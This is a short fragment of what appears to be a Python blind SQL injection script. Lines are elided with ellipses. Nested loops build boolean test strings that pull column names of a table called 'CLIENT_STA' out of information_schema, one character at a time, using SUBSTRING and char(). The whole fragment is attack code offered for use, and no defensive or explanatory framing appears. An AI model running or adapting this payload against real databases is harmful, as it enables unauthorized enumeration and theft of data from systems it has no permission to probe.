...
for w in range(157,175): # word[w]
    ...
    for i in range(0, 50):
        ...
        for ch in range(33,127):
            ...
            tst = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={getConcat('CLIENT_STA')} LIMIT {w},1),{i},1)=char({ch})" 
